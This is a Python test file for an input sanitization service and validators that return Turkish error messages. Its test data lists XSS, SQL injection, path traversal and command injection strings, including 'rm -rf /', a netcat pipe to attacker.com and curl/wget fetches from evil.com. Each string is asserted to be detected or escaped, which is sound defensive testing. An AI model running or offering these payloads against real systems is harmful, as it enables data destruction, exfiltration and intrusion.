"""
Ultra enterprise input sanitization tests for Task 3.10.
Tests comprehensive input validation and sanitization services.
"""

import pytest
from typing import Dict, Any

from app.services.input_sanitization_service import input_sanitization_service
from app.validators.security_validators import (
    sanitize_text_field,
    sanitize_html_field,
    sanitize_filename_field,
    validate_url_field,
    validate_sql_safe_field,
    CommonValidators,
)


class TestInputSanitizationService:
    """Test input sanitization service functionality."""

    def test_html_sanitization_basic(self):
        """Test basic HTML sanitization."""

        test_cases = [
            (
                "<script>alert('xss')</script>",
                "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;",
            ),
            ("<img src=x onerror=alert(1)>", "&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;"),
            ("'DROP TABLE users;", "&#x27;DROP TABLE users;"),
            ("Normal text", "Normal text"),
            ("", ""),
            ("Text with & symbols", "Text with &amp; symbols"),
            (
                '<a href="javascript:alert()">link</a>',
                '&lt;a href&#x3D;"javascript:alert()"&gt;link&lt;/a&gt;',
            ),
        ]

        for input_text, expected in test_cases:
            result = input_sanitization_service.sanitize_html(input_text)
            assert result == expected

    def test_comprehensive_validation(self):
        """Test comprehensive security validation."""

        # Safe content should pass
        safe_content = "This is normal text content"
        result = input_sanitization_service.comprehensive_validate(safe_content)

        assert result["is_safe"] is True
        assert result["threats"] == []
        assert result["sanitized"] == "This is normal text content"

        # XSS content should be detected
        xss_content = "<script>alert('xss')</script>"
        result = input_sanitization_service.comprehensive_validate(xss_content)

        assert result["is_safe"] is False
        assert len(result["threats"]) > 0
        assert any(threat["type"] == "XSS" for threat in result["threats"])
        assert "&lt;script&gt;" in result["sanitized"]

    def test_xss_pattern_detection(self):
        """Test XSS pattern detection."""

        xss_patterns = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "onload=alert(1)",
            "onerror=alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=alert(1)>",
            "eval('malicious')",
            "setTimeout('alert(1)', 1000)",
        ]

        for pattern in xss_patterns:
            result = input_sanitization_service.validate_against_xss(pattern)
            assert result["is_safe"] is False
            assert len(result["threats"]) > 0

    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""

        sql_patterns = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM table; --",
            "'; EXEC xp_cmdshell('dir'); --",
        ]

        for pattern in sql_patterns:
            result = input_sanitization_service.validate_against_sql_injection(pattern)
            assert result["is_safe"] is False
            assert len(result["threats"]) > 0

    def test_path_traversal_detection(self):
        """Test path traversal pattern detection."""

        path_patterns = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f",
            "~/../../secret.txt",
        ]

        for pattern in path_patterns:
            result = input_sanitization_service.validate_against_path_traversal(pattern)
            assert result["is_safe"] is False
            assert len(result["threats"]) > 0

    def test_command_injection_detection(self):
        """Test command injection pattern detection."""

        cmd_patterns = [
            "file.txt; rm -rf /",
            "input | nc attacker.com 8080",
            "data && wget malicious.com/shell",
            "$(curl evil.com/payload)",
            "`whoami`",
            "input || cat /etc/passwd",
        ]

        for pattern in cmd_patterns:
            result = input_sanitization_service.validate_against_command_injection(pattern)
            assert result["is_safe"] is False
            assert len(result["threats"]) > 0

    def test_filename_sanitization(self):
        """Test filename sanitization."""

        test_cases = [
            ("normal_file.txt", "normal_file.txt"),
            ("file with spaces.txt", "file with spaces.txt"),
            ("../../../etc/passwd", "______etc_passwd"),
            ('file<>:"|?*.txt', "file________.txt"),
            ("", "file"),
            ("file\x00null.txt", "filenull.txt"),
            ("very_long_filename" * 20 + ".txt", "very_long_filename.txt"),  # Truncated
        ]

        for input_name, expected_pattern in test_cases:
            result = input_sanitization_service.sanitize_filename(input_name)

            if expected_pattern == "file":
                assert result == "file"
            elif "______" in expected_pattern:
                # Check that dangerous characters are replaced
                assert all(char not in result for char in '<>:"|?*\\/')
            else:
                assert result == expected_pattern

    def test_url_sanitization(self):
        """Test URL sanitization and validation."""

        test_cases = [
            ("https://example.com", "https://example.com"),
            ("http://example.com/path?query=value", "http://example.com/path?query=value"),
            ("javascript:alert('xss')", None),
            ("ftp://example.com", None),
            ("data:text/html,<script>", None),
            ("", None),
            ("not-a-url", None),
            ("https://example.com/path with spaces", "https://example.com/path with spaces"),
        ]

        for input_url, expected in test_cases:
            result = input_sanitization_service.sanitize_url(input_url)
            assert result == expected

    def test_security_error_messages_turkish(self):
        """Test that security error messages are in Turkish."""

        xss_threats = [{"type": "XSS", "pattern": "script", "matches": ["<script>"]}]
        sql_threats = [{"type": "SQL_INJECTION", "pattern": "union", "matches": ["UNION"]}]
        multiple_threats = xss_threats + sql_threats

        # Test XSS message
        message = input_sanitization_service.get_security_error_message(xss_threats)
        assert "Güvenlik" in message
        assert "XSS" in message

        # Test SQL injection message
        message = input_sanitization_service.get_security_error_message(sql_threats)
        assert "Güvenlik" in message
        assert "SQL" in message

        # Test multiple threats message
        message = input_sanitization_service.get_security_error_message(multiple_threats)
        assert "Güvenlik" in message
        assert "Birden fazla" in message


class TestSecurityValidators:
    """Test Pydantic security validators."""

    def test_sanitize_text_field_validator(self):
        """Test text field sanitization validator."""

        # Safe text should pass through
        safe_text = "This is safe text"
        result = sanitize_text_field(safe_text)
        assert result == safe_text

        # Dangerous text should raise ValueError with Turkish message
        dangerous_text = "<script>alert('xss')</script>"
        with pytest.raises(ValueError) as exc_info:
            sanitize_text_field(dangerous_text)

        assert "Güvenlik" in str(exc_info.value)
        assert "şüpheli içerik" in str(exc_info.value).lower()

    def test_sanitize_html_field_validator(self):
        """Test HTML field sanitization validator."""

        # Non-XSS HTML should be escaped
        html_text = "<p>Safe paragraph</p>"
        with pytest.raises(ValueError) as exc_info:
            sanitize_html_field(html_text)

        assert "XSS" in str(exc_info.value)
        assert "Güvenlik" in str(exc_info.value)

    def test_filename_validator(self):
        """Test filename validator."""

        # Safe filename
        safe_filename = "document.txt"
        result = sanitize_filename_field(safe_filename)
        assert result == safe_filename

        # Dangerous filename should be sanitized
        dangerous_filename = "../../../etc/passwd"
        result = sanitize_filename_field(dangerous_filename)
        assert result != dangerous_filename
        assert "/" not in result and "\\" not in result

    def test_url_validator(self):
        """Test URL validator."""

        # Valid URL
        valid_url = "https://example.com"
        result = validate_url_field(valid_url)
        assert result == valid_url

        # Invalid/dangerous URL should raise error
        with pytest.raises(ValueError) as exc_info:
            validate_url_field("javascript:alert('xss')")

        assert "Güvenlik" in str(exc_info.value)
        assert "URL" in str(exc_info.value)

    def test_sql_safe_validator(self):
        """Test SQL-safe field validator."""

        # Safe text
        safe_text = "Normal user input"
        result = validate_sql_safe_field(safe_text)
        assert result == "Normal user input"

        # SQL injection attempt
        with pytest.raises(ValueError) as exc_info:
            validate_sql_safe_field("'; DROP TABLE users; --")

        assert "Güvenlik" in str(exc_info.value)
        assert "SQL" in str(exc_info.value)

    def test_common_validators(self):
        """Test common validator functions."""

        # Test user input text
        safe_text = CommonValidators.user_input_text("Safe text")
        assert safe_text == "Safe text"

        # Test filename validation
        safe_filename = CommonValidators.file_name("document.pdf")
        assert safe_filename == "document.pdf"

        # Test URL validation
        safe_url = CommonValidators.external_url("https://example.com")
        assert safe_url == "https://example.com"

    def test_edge_cases(self):
        """Test edge cases in validation."""

        # None values
        assert sanitize_text_field(None) == ""
        assert sanitize_filename_field(None) == "file"

        # Empty strings
        assert sanitize_text_field("") == ""
        assert sanitize_filename_field("") == "file"

        # Non-string inputs
        assert sanitize_text_field(123) == "123"
        assert sanitize_filename_field(123) == "123"

        # Very long inputs
        long_text = "A" * 50000
        result = sanitize_text_field(long_text)
        assert len(result) <= 10000  # Should be truncated

    def test_performance_with_large_inputs(self):
        """Test validation performance with large inputs."""

        import time

        large_text = "Safe text content " * 1000  # ~18KB

        start_time = time.time()
        result = input_sanitization_service.comprehensive_validate(large_text)
        end_time = time.time()

        # Should complete within reasonable time (< 1 second)
        assert end_time - start_time < 1.0
        assert result["is_safe"] is True

    def test_unicode_handling(self):
        """Test proper Unicode handling in sanitization."""

        unicode_text = "Unicode test: üöäß 中文 العربية 🚀"
        result = input_sanitization_service.sanitize_text_input(unicode_text)

        # Unicode should be preserved (not corrupted)
        assert "Unicode test:" in result
        # But HTML-escaped for safety
        assert "üöäß" in result or "&#" in result  # Either preserved or entity-encoded

    def test_mixed_threat_detection(self):
        """Test detection of multiple threat types in single input."""

        mixed_threat = "<script>alert('XSS')</script>'; DROP TABLE users; --"
        result = input_sanitization_service.comprehensive_validate(mixed_threat)

        assert result["is_safe"] is False

        # Should detect both XSS and SQL injection
        threat_types = [threat["type"] for threat in result["threats"]]
        assert "XSS" in threat_types
        assert "SQL_INJECTION" in threat_types
